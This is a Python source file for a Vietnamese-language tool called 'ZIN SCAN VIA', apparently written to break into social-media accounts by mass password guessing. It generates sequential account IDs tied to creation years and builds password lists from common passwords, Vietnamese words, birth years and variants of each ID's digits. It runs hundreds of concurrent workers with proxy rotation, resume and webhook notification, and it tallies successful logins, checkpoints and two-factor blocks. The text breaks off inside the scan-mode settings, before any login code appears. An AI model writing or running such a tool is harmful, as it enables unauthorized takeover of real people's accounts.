#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════╗
║                           ZIN SCAN VIA - VĨNH HẰNG THIÊN TÔN                    ║
║                             I AM THE ONE ABOVE EVERYTHING                         ║
╚══════════════════════════════════════════════╝
"""

import os
import sys
import json
import uuid
import string
import random
import time
import re
import signal
import shutil
import asyncio
import threading
from datetime import datetime
from pathlib import Path

# ─── Kiểm tra thư viện ───
_THIEU = []
try:
    import httpx
except ImportError:
    _THIEU.append("httpx")
try:
    import aiofiles
except ImportError:
    _THIEU.append("aiofiles")
if _THIEU:
    sys.stderr.write(
        f"LỖI: Thiếu thư viện: {', '.join(_THIEU)}\n"
        f"Cài đặt: pip install {' '.join(_THIEU)}\n"
    )
    sys.exit(1)

try:
    _PHIEN_BAN_HTTPX = tuple(
        int(x) for x in httpx.__version__.split(".")[:2] if x.isdigit()
    )
except (ValueError, AttributeError):
    _PHIEN_BAN_HTTPX = (0, 0)

_HTTPX_PROXY_MOI = _PHIEN_BAN_HTTPX >= (0, 26)
if not _HTTPX_PROXY_MOI:
    sys.stderr.write(
        f"[Cảnh báo] httpx {httpx.__version__} < 0.26 — dùng tham số "
        f"'proxies'. Khuyến nghị: pip install -U 'httpx>=0.27'\n"
    )

# Khóa toàn cục cho stdout — tránh xen dòng giữa title thread và worker
_STDOUT_KHOA = threading.Lock()

KHUNG_RONG_GOC = 46


# ═══════════════════════════════════════════════════════════
# CẤU HÌNH
# ═══════════════════════════════════════════════════════════
_NHA = Path.home()


def _do_thu_muc_mac_dinh():
    try:
        if os.path.isdir("/sdcard") and os.access("/sdcard", os.W_OK):
            return "/sdcard"
    except (OSError, PermissionError):
        pass
    return str(_NHA)


CONFIG = {
    "output_dir": _do_thu_muc_mac_dinh(),
    "state_file": str(_NHA / "zin_state.json"),
    "proxy_file": str(_NHA / "proxies.txt"),

    "concurrency": 120,
    "queue_maxsize": 400,
    "uid_generate_chunk": 40_000,
    "worker_poll_timeout": 0.1,
    "timeout": 10.0,
    "max_retries": 2,
    "retry_backoff": 1.5,
    "rate_limit": 0,

    "enable_proxy": False,
    "enable_resume": True,
    "smart_passwords": True,
    "notify_webhook": "",
    "webhook_timeout": 5.0,
    "save_formats": ["txt"],
    "max_limit": 1_000_000,
    "verify_tls": True,
    "dry_run": False,
    "beep": False,
    "seen_global_max": 300_000,
    "animation": True,
}


# ═══════════════════════════════════════════════════════════
# MÀU SẮC
# ═══════════════════════════════════════════════════════════
class C:
    R  = '\033[0m'; B  = '\033[1m'; D  = '\033[2m'
    RED    = '\033[38;5;196m'; ORANGE = '\033[38;5;208m'
    YELLOW = '\033[38;5;226m'; GREEN  = '\033[38;5;46m'
    CYAN   = '\033[38;5;51m';  BLUE   = '\033[38;5;27m'
    PURPLE = '\033[38;5;129m'; PINK   = '\033[38;5;213m'
    GOLD   = '\033[38;5;220m'; WHITE  = '\033[38;5;231m'
    GRAY   = '\033[38;5;245m'; LIME   = '\033[38;5;154m'
    AQUA   = '\033[38;5;123m'; VIOLET = '\033[38;5;171m'
    CRIMSON= '\033[38;5;161m'; SKY    = '\033[38;5;117m'
    MAGENTA= '\033[38;5;201m'; CORAL  = '\033[38;5;203m'
    MINT   = '\033[38;5;121m'
    CLEAR  = '\033[K'

RAINBOW  = [C.RED, C.ORANGE, C.YELLOW, C.GREEN, C.CYAN, C.BLUE, C.PURPLE]
RAINBOW2 = [C.PINK, C.CRIMSON, C.CORAL, C.GOLD, C.MINT, C.AQUA, C.SKY, C.VIOLET]
RAINBOW3 = [C.CORAL, C.MAGENTA, C.VIOLET, C.BLUE, C.CYAN, C.LIME, C.YELLOW, C.ORANGE]
SPINNER  = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]


# ═══════════════════════════════════════════════════════════
# ANSI-AWARE HELPERS — chống wrap
# ═══════════════════════════════════════════════════════════
_ANSI_RE = re.compile(r'\x1b\[[0-9;?]*[a-zA-Z]|\x1b\][^\x07]*\x07')


def _rong_terminal():
    try:
        return shutil.get_terminal_size(fallback=(80, 24)).columns
    except Exception:
        return 80


def _rong_khung():
    """Chiều rộng khung tối ưu theo terminal hiện tại (luôn chừa 4 cột lề)."""
    try:
        tw = shutil.get_terminal_size(fallback=(80, 24)).columns
    except Exception:
        tw = 80
    return max(24, min(KHUNG_RONG_GOC, tw - 4))


def _rong_hien_thi(s):
    """Độ dài hiển thị thực (bỏ ANSI escape)."""
    return len(_ANSI_RE.sub('', s))


def _cat_theo_rong(s, toi_da):
    """Cắt chuỗi có ANSI để hiển thị <= toi_da cột. Giữ escape nguyên vẹn."""
    if _rong_hien_thi(s) <= toi_da:
        return s
    out = []
    dem = 0
    i, n = 0, len(s)
    while i < n:
        m = _ANSI_RE.match(s, i)
        if m:
            out.append(m.group())
            i = m.end()
            continue
        if dem >= toi_da:
            break
        out.append(s[i])
        dem += 1
        i += 1
    out.append(C.R)
    return ''.join(out)


# ═══════════════════════════════════════════════════════════
# TIỆN ÍCH GIAO DIỆN
# ═══════════════════════════════════════════════════════════
def co_ho_tro_ansi():
    try:
        if os.environ.get("TERM", "").lower() == "dumb":
            return False
        try:
            if not sys.stdout.isatty():
                if not (os.environ.get("TERMUX_VERSION") or
                        os.environ.get("PREFIX", "").find("termux") >= 0):
                    return False
        except (OSError, AttributeError):
            pass
        return True
    except Exception:
        return True


_HOAT_HINH_OK = co_ho_tro_ansi() and CONFIG["animation"]


def mau_cau_vong(text, palette=None, do_lech=0):
    palette = palette or RAINBOW
    return "".join(palette[(i + do_lech) % len(palette)] + ch
                   for i, ch in enumerate(text)) + C.R


def vien_cau_vong(ky_tu="═", rong=None, palette=None, do_lech=0):
    if rong is None:
        rong = _rong_khung()
    palette = palette or RAINBOW
    return "".join(palette[(i + do_lech) % len(palette)] + ky_tu
                   for i in range(rong)) + C.R


def hop_can_giua(text, rong=None):
    if rong is None:
        rong = _rong_khung()

    if len(text) + 2 > rong:
        text = text[:max(1, rong - 4)]

    tren   = "╔" + "═" * (rong - 2) + "╗"
    duoi   = "╚" + "═" * (rong - 2) + "╝"
    trong  = "║" + " " * (rong - 2) + "║"
    le_trai = (rong - 2 - len(text)) // 2
    le_phai = (rong - 2 - len(text)) - le_trai
    print(mau_cau_vong(tren))
    print(mau_cau_vong(trong, palette=RAINBOW2))
    print(C.CYAN + "║" + C.R + " " * le_trai +
          mau_cau_vong(text, palette=RAINBOW) +
          " " * le_phai + C.CYAN + "║" + C.R)
    print(mau_cau_vong(trong, palette=RAINBOW2))
    print(mau_cau_vong(duoi))


def vach_ngan():
    print(f"  {C.GRAY}{'·' * _rong_khung()}{C.R}")


def tieng_keo():
    if CONFIG["beep"]:
        try:
            sys.stdout.write('\a'); sys.stdout.flush()
        except OSError:
            pass


# ═══════════════════════════════════════════════════════════
# ANIMATION
# ═══════════════════════════════════════════════════════════
def hieu_ung_song(text, palette=None, thoi_gian=1.5, do_tre=0.07, le="  "):
    if not text:
        return
    palette = palette or RAINBOW
    if not _HOAT_HINH_OK or thoi_gian <= 0:
        print(f"{le}{mau_cau_vong(text, palette=palette)}")
        return
    bat_dau = time.time()
    do_lech = 0
    while time.time() - bat_dau < thoi_gian:
        chu_mau = "".join(
            palette[(i + do_lech) % len(palette)] + ch
            for i, ch in enumerate(text)
        )
        try:
            with _STDOUT_KHOA:
                sys.stdout.write(f"\r\033[2K{le}{chu_mau}{C.R}")
                sys.stdout.flush()
        except OSError:
            return
        do_lech += 1
        time.sleep(do_tre)
    chu_cuoi = "".join(
        palette[i % len(palette)] + ch for i, ch in enumerate(text)
    )
    try:
        with _STDOUT_KHOA:
            sys.stdout.write(f"\r\033[2K{le}{chu_cuoi}{C.R}\n")
            sys.stdout.flush()
    except OSError:
        pass


def nhap_nhay(text, mau=None, so_lan=3, do_tre=0.18, le="  "):
    mau = mau or C.GOLD
    if not _HOAT_HINH_OK or so_lan <= 0:
        print(f"{le}{mau}{C.B}{text}{C.R}")
        return
    for _ in range(so_lan):
        try:
            with _STDOUT_KHOA:
                sys.stdout.write(f"\r\033[2K{le}{mau}{C.B}{text}{C.R}")
                sys.stdout.flush()
            time.sleep(do_tre)
            with _STDOUT_KHOA:
                sys.stdout.write(f"\r\033[2K{le}{C.D}{text}{C.R}")
                sys.stdout.flush()
            time.sleep(do_tre)
        except OSError:
            return
    try:
        with _STDOUT_KHOA:
            sys.stdout.write(f"\r\033[2K{le}{mau}{C.B}{text}{C.R}\n")
            sys.stdout.flush()
    except OSError:
        pass


def cham_cho(text="Đang xử lý", thoi_gian=1.2, mau=None, le="  "):
    mau = mau or C.CYAN
    if not _HOAT_HINH_OK or thoi_gian <= 0:
        print(f"{le}{mau}{text}...{C.R}")
        return
    bat_dau = time.time()
    i = 0
    while time.time() - bat_dau < thoi_gian:
        so_cham = i % 4
        dau_cham = ("." * so_cham).ljust(4)
        try:
            with _STDOUT_KHOA:
                sys.stdout.write(
                    f"\r\033[2K{le}{mau}{text}{dau_cham}{C.R}")
                sys.stdout.flush()
        except OSError:
            return
        i += 1
        time.sleep(0.15)
    try:
        with _STDOUT_KHOA:
            sys.stdout.write(f"\r\033[2K{le}{mau}{text}...{C.R}\n")
            sys.stdout.flush()
    except OSError:
        pass


def xoay_tron(text, thoi_gian=1.0, mau=None, le="  ", bieu_tuong_ket="✓"):
    mau = mau or C.CYAN
    if not _HOAT_HINH_OK or thoi_gian <= 0:
        print(f"{le}{C.GREEN}{bieu_tuong_ket}{C.R} {mau}{text}{C.R}")
        return
    bat_dau = time.time()
    i = 0
    while time.time() - bat_dau < thoi_gian:
        xoay = SPINNER[i % len(SPINNER)]
        mau_xoay = RAINBOW[i % len(RAINBOW)]
        try:
            with _STDOUT_KHOA:
                sys.stdout.write(
                    f"\r\033[2K{le}{mau_xoay}{xoay}{C.R} "
                    f"{mau}{text}{C.R}")
                sys.stdout.flush()
        except OSError:
            return
        i += 1
        time.sleep(0.08)
    try:
        with _STDOUT_KHOA:
            sys.stdout.write(
                f"\r\033[2K{le}{C.GREEN}{bieu_tuong_ket}{C.R} "
                f"{mau}{text}{C.R}\n")
            sys.stdout.flush()
    except OSError:
        pass


# ═══════════════════════════════════════════════════════════
# TIÊU ĐỀ ĐỘNG
# ═══════════════════════════════════════════════════════════
class TieuDeDong:
    def __init__(self):
        self._dung = False
        self._luong = None
        self._thong_ke = None
        self._cho_phep = threading.Event()
        self._cho_phep.set()
        self._khung = [
            "𓁹 ZIN SCAN VIA 𓁹",
            "☯ TRANSCENDENT ☯ ",
            "✨ Đang quét... ✨",
            "∞ Vô Thượng Pháp Trận ∞",
        ]

    def bat_dau(self, thong_ke):
        self._thong_ke = thong_ke
        self._dung = False
        self._luong = threading.Thread(
            target=self._vong_lap, daemon=True)
        self._luong.start()

    def dung(self):
        self._dung = True
        self._cho_phep.set()

    def tam_dung(self):
        self._cho_phep.clear()

    def tiep_tuc(self):
        self._cho_phep.set()

    def _vong_lap(self):
        i = 0
        while not self._dung:
            if not self._cho_phep.wait(timeout=1.0):
                continue
            if self._dung:
                return
            try:
                if self._thong_ke:
                    ts = self._thong_ke
                    tieu_de = (
                        f"ZIN | OK:{ts.thanh_cong} "
                        f"CP:{ts.chan} 2FA:{ts.hai_buoc} "
                        f"| UID:{ts.uid_da_xu_ly} "
                        f"| {ts.toc_do_uid():.1f}/s"
                    )
                    if i % 4 == 0:
                        khung = self._khung[(i // 4) % len(self._khung)]
                        tieu_de = f"{khung} | {tieu_de}"
                else:
                    tieu_de = self._khung[i % len(self._khung)]
                with _STDOUT_KHOA:
                    sys.stdout.write(f"\033]0;{tieu_de}\007")
                    sys.stdout.flush()
            except OSError:
                return
            i += 1
            time.sleep(1.5)


# ═══════════════════════════════════════════════════════════
# IN LOGO
# ═══════════════════════════════════════════════════════════
def in_logo(hoat_hinh=True):
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
    except OSError:
        pass
    print()
    print("  " + vien_cau_vong("✦"))
    print()
    hop_can_giua("ZIN TOOL SCAN - GOD OF REALITY")
    print()

    rong_k = _rong_khung()
    nhan = " ∞ Vô Thượng Pháp Trận ∞ "
    gach = "─" * max(2, (rong_k - len(nhan)) // 2)
    dong_trang_tri = gach + nhan + gach

    if hoat_hinh and _HOAT_HINH_OK:
        hieu_ung_song(dong_trang_tri, palette=RAINBOW3,
                      thoi_gian=0.6, do_tre=0.05)
    else:
        print("  " + mau_cau_vong(dong_trang_tri, palette=RAINBOW3))
    print()
    print("  " + vien_cau_vong("✦", palette=RAINBOW2))
    print()


# ═══════════════════════════════════════════════════════════
# LOGO ANIMATION VÔ HẠN — chạy đến khi user nhấn Enter
# ═══════════════════════════════════════════════════════════
def in_logo_vo_han():
    """
    Animation logo chạy LIÊN TỤC cho đến khi user nhấn Enter.
    Vẽ lại toàn màn hình mỗi frame → không nhấp nháy.
    """
    if not _HOAT_HINH_OK:
        in_logo(hoat_hinh=False)
        return

    import select

    rong_k = _rong_khung()

    nhan_tag = " ∞ Vô Thượng Pháp Trận ∞ "
    gach_tag = "─" * max(2, (rong_k - len(nhan_tag)) // 2)
    dong_tag = gach_tag + nhan_tag + gach_tag

    tieu_de = "ZIN SCAN VIA - SUPREME GOD"
    if len(tieu_de) + 2 > rong_k:
        tieu_de = tieu_de[:max(1, rong_k - 4)]

    tren  = "╔" + "═" * (rong_k - 2) + "╗"
    duoi  = "╚" + "═" * (rong_k - 2) + "╝"
    trong = "║" + " " * (rong_k - 2) + "║"
    le_trai = (rong_k - 2 - len(tieu_de)) // 2
    le_phai = (rong_k - 2 - len(tieu_de)) - le_trai

    def ve(do_lech):
        lines = ["", "  " + "".join(
            RAINBOW[(i + do_lech) % len(RAINBOW)] + "✦"
            for i in range(rong_k)
        ) + C.R, ""]

        lines.append(mau_cau_vong(tren, do_lech=do_lech))
        lines.append(mau_cau_vong(trong, palette=RAINBOW2, do_lech=do_lech))

        chu_td = "".join(
            RAINBOW[(j + do_lech) % len(RAINBOW)] + ch
            for j, ch in enumerate(tieu_de)
        )
        lines.append(C.CYAN + "║" + C.R + " " * le_trai +
                     chu_td + " " * le_phai + C.CYAN + "║" + C.R)

        lines.append(mau_cau_vong(trong, palette=RAINBOW2, do_lech=do_lech))
        lines.append(mau_cau_vong(duoi, do_lech=do_lech))
        lines.append("")

        tag = "".join(
            RAINBOW3[(i + do_lech) % len(RAINBOW3)] + ch
            for i, ch in enumerate(dong_tag)
        ) + C.R
        lines.append("  " + tag)
        lines.append("")

        lines.append("  " + "".join(
            RAINBOW2[(i + do_lech) % len(RAINBOW2)] + "✦"
            for i in range(rong_k)
        ) + C.R)
        lines.append("")
        lines.append(
            f"  {C.GRAY}▸ Nhấn {C.WHITE}{C.B}Enter{C.R}"
            f"{C.GRAY} để tiếp tục...{C.R}"
        )
        return "\n".join(lines)

    try:
        with _STDOUT_KHOA:
            sys.stdout.write("\033[?25l")  # ẩn con trỏ
            sys.stdout.flush()

        do_lech = 0
        while True:
            khung = ve(do_lech)
            with _STDOUT_KHOA:
                # \033[H = home cursor, \033[J = clear to end
                sys.stdout.write("\033[H\033[J" + khung)
                sys.stdout.flush()

            try:
                r, _, _ = select.select([sys.stdin], [], [], 0.08)
                if r:
                    try:
                        sys.stdin.readline()
                    except (OSError, EOFError):
                        pass
                    break
            except (OSError, ValueError):
                time.sleep(0.08)
            do_lech += 1
    finally:
        with _STDOUT_KHOA:
            sys.stdout.write("\033[?25h")  # hiện con trỏ
            sys.stdout.flush()
        try:
            os.system('cls' if os.name == 'nt' else 'clear')
        except OSError:
            pass


# ═══════════════════════════════════════════════════════════
# SINH UID
# ═══════════════════════════════════════════════════════════
SERIES_MAP = {
    "1": ("2011-2012", ("100009",), 9),
    "2": ("2010",      ("10001",), 10),
    "3": ("2009",      ("1000000", "1000001", "1000002",
                        "1000003", "1000004", "1000005"), 9),
    "4": ("2008",      ("1000000",), 8),
    "5": ("2007",      ("10000000",), 7),
    "6": ("2005-2006", ("100000000",), 6),
    "7": ("NGẪU NHIÊN", "NGẪU NHIÊN", 0),
}

NHOM_TIEN_TO_NGAU_NHIEN = (
    ("100009", 9), ("10001", 10), ("100001", 9), ("100011", 9),
    ("1000000", 8), ("1000001", 8), ("1000010", 8), ("1000100", 8),
    ("1000002", 8), ("1000101", 8),
    ("10000000", 7), ("10000001", 7), ("10000010", 7),
    ("10000100", 7), ("10001000", 7),
    ("100000000", 6), ("100000001", 6), ("100000010", 6),
    ("100000100", 6), ("100001000", 6), ("100010000", 6),
    ("1000000000", 5), ("1000000001", 5), ("1000000010", 5),
    ("100000", 9), ("100010", 9), ("100100", 9),
)


class BoSinhUID:
    """Sinh UID dạng <prefix><số zero-pad> không bao giờ trùng."""

    def __init__(self, prefixes, do_dai_than, la_ngau_nhien=False):
        self.la_ngau_nhien = la_ngau_nhien
        self.prefixes = tuple(prefixes) if not la_ngau_nhien else None
        self.do_dai_than = do_dai_than
        self._trang_thai = {}
        self._tong_da_sinh = 0

    def _chon_cap(self):
        if self.la_ngau_nhien:
            return random.choice(NHOM_TIEN_TO_NGAU_NHIEN)
        return (random.choice(self.prefixes), self.do_dai_than)

    def _khoi_tao_counter(self, prefix, do_dai):
        mod = 10 ** do_dai
        start = random.randint(0, mod - 1)
        step = random.randint(1, mod - 1)
        while step % 2 == 0 or step % 5 == 0:
            step = random.randint(1, mod - 1)
        self._trang_thai[(prefix, do_dai)] = [start, step, 0]

    def sinh_mot(self):
        prefix, do_dai = self._chon_cap()
        key = (prefix, do_dai)
        if key not in self._trang_thai:
            self._khoi_tao_counter(prefix, do_dai)
        start, step, cnt = self._trang_thai[key]
        mod = 10 ** do_dai
        n = (start + cnt * step) % mod
        self._trang_thai[key][2] = cnt + 1
        self._tong_da_sinh += 1
        return prefix + str(n).zfill(do_dai)

    def sinh_lo(self, so_luong):
        return [self.sinh_mot() for _ in range(so_luong)]

    def so_da_sinh(self):
        return self._tong_da_sinh

    def canh_bao_gan_can(self, nguong=0.5):
        canh_bao = []
        for (prefix, do_dai), st in self._trang_thai.items():
            mod = 10 ** do_dai
            if st[2] / mod >= nguong:
                canh_bao.append(
                    f"prefix={prefix} len={do_dai}: "
                    f"{st[2]}/{mod} ({st[2]/mod*100:.1f}%)"
                )
        return canh_bao


# ═══════════════════════════════════════════════════════════
# MAP UID → NĂM
# ═══════════════════════════════════════════════════════════
UID_YEAR_MAP = (
    ("100009",     9, "2011-2012"),
    ("10001",     10, "2010"),
    ("1000000",    9, "2009"),
    ("1000000",    8, "2008"),
    ("10000000",   7, "2007"),
    ("100000000",  6, "2005-2006"),
    ("1000000000", 5, "2004-"),
    ("100001",     9, "2011-2012"),
    ("100011",     9, "2011-2012"),
    ("1000001",    8, "2008"),
    ("1000010",    8, "2008"),
    ("1000100",    8, "2008"),
    ("1000002",    8, "2008"),
    ("1000101",    8, "2008"),
    ("1000003",    9, "2009"),
    ("1000004",    9, "2009"),
    ("1000005",    9, "2009"),
    ("10000001",   7, "2007"),
    ("10000010",   7, "2007"),
    ("10000100",   7, "2007"),
    ("10001000",   7, "2007"),
    ("100000001",  6, "2005-2006"),
    ("100000010",  6, "2005-2006"),
    ("100000100",  6, "2005-2006"),
    ("100001000",  6, "2005-2006"),
    ("100010000",  6, "2005-2006"),
    ("1000000001", 5, "2004-"),
    ("1000000010", 5, "2004-"),
    ("100000",     9, "2011-2012"),
    ("100010",     9, "2011-2012"),
    ("100100",     9, "2011-2012"),
)

_UID_YEAR_SAP_XEP = tuple(sorted(UID_YEAR_MAP, key=lambda x: -len(x[0])))


def lay_nam_tai_khoan(uid):
    if not uid or not uid.isdigit():
        return "không rõ"
    for tien_to, do_dai, nam in _UID_YEAR_SAP_XEP:
        if uid.startswith(tien_to) and len(uid) == len(tien_to) + do_dai:
            return nam
    n = len(uid)
    if n == 15: return "2008-2012"
    if n == 16: return "2009-2010"
    if n == 14: return "2007-2008"
    if n == 13: return "2006-2007"
    if n == 12: return "2005-2006"
    if n == 11: return "2004-2005"
    return "không rõ"


# ═══════════════════════════════════════════════════════════
# CHIẾN LƯỢC MẬT KHẨU
# ═══════════════════════════════════════════════════════════
TOP_MAT_KHAU = (
    '123456', '12345678', '123456789', '1234567', '1234567890',
    'abc123', 'qwerty', 'password', '123123', '111111',
    '000000', 'iloveyou', '123456a', '12345678a', 'admin',
    'password123', 'welcome', 'monkey', 'login', 'abc12345',
    'matkhau', 'khongcopass', 'yeuem', 'yeu123', 'chaoem',
    'anhyeuem', 'emyeuanh', 'thanhcong', 'vietnam', 'hanoi',
)

TOP_60_MAT_KHAU = (
    '123456', '123456789', '12345678', 'password', 'qwerty',
    '12345', '123123', '111111', '1234567890', '1234567',
    'qwerty123', '1q2w3e', 'abc123', '000000', 'iloveyou',
    '11111111', 'password1', '1234', 'qwertyuiop', '654321',
    '123321', '666666', '88888888', '123456a', '555555',
    '1qaz2wsx', '222222', '1111111', '123abc', '121212',
    '7777777', 'asdfghjkl', 'zxcvbnm', '112233', '123456789a',
    '987654321', '123123123', '1q2w3e4r', 'qazwsx', 'aa123456',
    'a123456', '123qwe', '1qazxsw2', 'password123', 'admin',
    'admin123', 'root', 'welcome', 'monkey', 'dragon',
    'master', 'letmein', 'football', 'baseball', 'superman',
    'batman', 'naruto', 'onepiece', 'facebook', 'khongcopass',
)

_BASE_CO_BAN = (
    '123456', '1234567', '12345678', '123456789', '1234567890',
    '111111', '222222', '333333', '444444', '555555',
    '666666', '777777', '888888', '999999', '000000',
    '00000000', '11111111', '0987654321',
    '987654321', '9876543210', '1234554321',
    '123123', '112233', '121212', '123321', '456456',
    '654321', '11223344', '1122334455', '556677', '778899',
    '010203', '111222', '111222333', '123123123',
    'password', 'password123', 'password1234',
    'qwerty', 'qwerty123', 'qwertyuiop', 'qwertyuiop123',
    'qwerty1', 'qwerty12', 'qwerty1234',
    'abc123', 'abc12345', 'abcd1234', 'abc1234',
    'abcabc', 'abcxyz', 'abc000', 'abc111', 'abc222',
    'abc333', 'abc444', 'abc555',
    'iloveyou', 'admin', 'welcome', 'monkey', 'login',
    'letmein', 'admin123', 'admin@123', 'root', 'toor',
    'guest', 'test', 'test123',
    'Aa123456', 'aA123456', 'Aa123456789', '123456Aa',
    '123456aA', '123456789Aa', 'A123456', 'a123456',
    '12345678Aa', '12345678a',
    '1q2w3e4r', '1qaz2wsx', '1qazxsw2', 'zaq12wsx',
    'qwe123', 'asd123', 'zxc123',
    'qazwsx', 'qazwsxedc', 'qazwsx123',
    'qweasd', 'qweasdzxc', 'qweasd123',
    'asdf1234', 'asdfgh', 'asdfgh123', 'asdf123',
    'asdfghjkl', 'asdfghjkl123',
    'zxcvbn', 'zxcvbnm', 'zxcvbnm123', 'zxcvbn123',
    '1234qwer', 'qwer1234',
    '123456789a', 'a123456789',
    'love', 'love123', 'loveyou', 'iloveu',
    'hello', 'hello123', 'hi123', 'hey123',
    'facebook', 'facebook123', 'fb123', 'fb123456',
    'google', 'gmail', 'gmail123',
    'coffee', 'music', 'football', 'soccer',
    'superman', 'batman', 'naruto', 'onepiece',
    'khongcopass', 'khongcomatkhau', 'khongcomatkhau123',
    'matkhau', 'matkhau123',
)

_BASE_TIENG_VIET = (
    'yeu', 'yeuem', 'yeuanh', 'yeu123', 'yeu123456',
    'anhyeuem', 'emyeuanh', 'yeuemnhieu', 'yeuanhnhieu',
    'nhoye', 'nhoem', 'nhoanh', 'nhieu',
    'me', 'me123', 'meocon', 'meocon123',
    'ba', 'ba123', 'ong', 'ong123', 'noi', 'noi123',
    'con', 'conyeu', 'con123',
    'ban', 'banthan', 'banthan123',
    'banbe', 'anh', 'anh123', 'em', 'em123',
    'vui', 'vui123', 'buon', 'buon123',
    'hanhphuc', 'hanhphuc123', 'camon', 'camon123',
    'chaoem', 'chaonhe', 'chaomung',
    '0901234567', '0912345678', '0987654321',
    'vietnam', 'vietnam123', 'vietnam2024', 'vietnamese',
    'saigon', 'saigon123', 'hanoi', 'hanoi123',
    'danang', 'danang123', 'hue', 'hue123',
    'cantho', 'cantho123', 'vungtau', 'nhatrang',
    'sinh', 'sinhnhat', 'sinhnhat123',
    'ngaysinh', 'ngaythang', 'thang', 'nam',
    '0101', '0102', '0103', '0201', '0303',
    '0404', '0505', '0606', '0707', '0808',
    '0909', '1010', '1111', '1212',
    'thanhcong', 'thanhcong123', 'thanhcong2024',
    'hoc', 'hocgioi', 'hocsinh', 'sinhvien',
)


class ChienLuocMatKhau:
    @staticmethod
    def _tao_nhanh(uid):
        tap = list(TOP_MAT_KHAU)
        chu_so = re.findall(r'\d+', uid)
        if chu_so:
            duoi = chu_so[-1]
            duoi_8 = duoi[-8:] if len(duoi) >= 8 else duoi
            duoi_6 = duoi[-6:] if len(duoi) >= 6 else duoi
            duoi_4 = duoi[-4:] if len(duoi) >= 4 else ""
            tap.insert(0, duoi)
            tap.insert(1, duoi_8)
            tap.insert(2, duoi_6)
            if duoi_4:
                tap.insert(3, duoi_4)
            tap.insert(4, duoi_6 + "123")
            tap.insert(5, duoi_6 + "a")
            tap.insert(6, "a" + duoi_6)
            tap.insert(7, duoi_8 + "123")
        return tap

    @staticmethod
    def _tao_base_vn():
        tap = set()
        tap.update(_BASE_CO_BAN)
        tap.update(_BASE_TIENG_VIET)
        for nam in range(1950, 2025):
            nam_s = str(nam)
            tap.add(nam_s)
            if nam >= 1990:
                tap.add("sinh" + nam_s)
                tap.add("fb" + nam_s)
                tap.add("pass" + nam_s)
                tap.add(nam_s + "a")
                tap.add("a" + nam_s)
                tap.add("abc" + nam_s)
                tap.add(nam_s + "abc")
        tap.discard("")
        tap = {mk for mk in tap if 3 <= len(mk) <= 50}
        uu_tien = sorted([mk for mk in tap if mk in TOP_MAT_KHAU])
        con_lai = sorted([mk for mk in tap if mk not in TOP_MAT_KHAU])
        return uu_tien + con_lai

    @staticmethod
    def _tao_uid_patterns(uid):
        tap = set()
        if not CONFIG["smart_passwords"]:
            return tap
        chu_so = re.findall(r'\d+', uid)
        if not chu_so:
            return tap
        duoi = chu_so[-1]
        do_dai = len(duoi)
        duoi_list = []
        for n in (10, 8, 7, 6, 5, 4, 3):
            if do_dai >= n:
                duoi_list.append(duoi[-n:])
        duoi_list.append(duoi)
        duoi_list = list(dict.fromkeys(duoi_list))

        for bien_the in duoi_list:
            if not bien_the:
                continue
            tap.add(bien_the)
            tap.add(bien_the[::-1])
            for hau in ('1', '12', '123', '1234', '12345',
                         '123456', '0', '00', '000',
                         'a', 'A', 'ab', 'Ab',
                         '@', '@123', '#', '!', '.', '_', '-',
                         'vip', 'pro', 'love', 'boy', 'girl',
                         'abc', 'xyz'):
                tap.add(bien_the + hau)
                tap.add(hau + bien_the)
            for nam in ("1990", "1991", "1992", "1993",
                         "1994", "1995", "1996", "1997",
                         "1998", "1999", "2000", "2001",
                         "2002", "2003", "2004", "2005",
                         "2006", "2007", "2008", "2009",
                         "2010", "2011", "2012"):
                tap.add(bien_the + nam)
                tap.add(nam + bien_the)
            for y2 in ("90", "91", "92", "93", "94", "95",
                       "96", "97", "98", "99", "00", "01",
                       "02", "03", "04", "05", "06", "07",
                       "08", "09", "10", "11", "12"):
                tap.add(bien_the + y2)
                tap.add(y2 + bien_the)

        if len(duoi) >= 9:
            tap.add(duoi[:6] + duoi[-3:])
            tap.add(duoi[-3:] + duoi[:6])
        if len(duoi) >= 12:
            tap.add(duoi[:6] + duoi[-6:])
            tap.add(duoi[-6:] + duoi[:6])
        if len(duoi) >= 10:
            tap.add(duoi[:5] + duoi[-5:])
            tap.add(duoi[-5:] + duoi[:5])
        if len(duoi) >= 4:
            tap.add(duoi[-4:] * 2)
            tap.add(duoi[-4:] * 3)
        if len(duoi) >= 3:
            tap.add(duoi[-3:] * 3)
            tap.add(duoi[-3:] * 4)
        if len(duoi) >= 6:
            tap.add("khongcopass" + duoi[-6:])
            tap.add("khongcomatkhau" + duoi[-6:])
            tap.add("matkhau" + duoi[-6:])
        tap.discard("")
        tap = {mk for mk in tap if 3 <= len(mk) <= 50}
        return tap

    @staticmethod
    def tao_danh_sach_nhanh(uid):
        return ChienLuocMatKhau._tao_nhanh(uid)

    @staticmethod
    def tao_danh_sach(uid, mode="supreme"):
        if mode == "fast":
            return list(TOP_60_MAT_KHAU)

        base_vn = ChienLuocMatKhau._tao_base_vn()

        if mode == "balanced":
            n = max(1, int(len(base_vn) * 0.7))
            return base_vn[:n]

        if mode == "thorough":
            return base_vn

        uid_pat = ChienLuocMatKhau._tao_uid_patterns(uid)
        if not uid_pat:
            return base_vn
        tap = set(base_vn) | uid_pat
        uu_tien = sorted([mk for mk in tap if mk in TOP_MAT_KHAU])
        con_lai = sorted([mk for mk in tap if mk not in TOP_MAT_KHAU])
        return uu_tien + con_lai


# ═══════════════════════════════════════════════════════════
# SCAN MODES
# ═══════════════════════════════════════════════════════════
SCAN_MODES = {
    "1": {
        "name": "SCAN NHANH",
        "icon": "⚡",
        "color": C.LIME,
        "min_workers": 10,
        "max_workers": 200,
        "default_workers": 150,
        "password_mode": "fast",
        "desc": "60 mật khẩu phổ biến toàn cầu",
    },
    "2": {
        "name": "SCAN CÂN BẰNG",
        "icon": "⚖",
        "color": C.CYAN,
        "min_workers": 40,
        "max_workers": 300,
        "default_workers": 120,
        "password_mode": "balanced",
        "desc": "70% password Base + VN",
    },
    "3": {
        "name": "SCAN KỸ LƯỠNG",
        "icon": "🎯",
        "color": C.GOLD,
        "min_workers": 60,
        "max_workers": 350,
        "default_workers": 150,
        "password_mode": "thorough",
        "desc": "Toàn bộ password Base + VN + Năm sinh",
    },
    "4": {
        "name": "SUPREME SCAN",
        "icon": "👑",
        "color": C.MAGENTA,
        "min_workers": 100,
        "max_workers": 500,
        "default_workers": 250,
        "password_mode": "supreme",
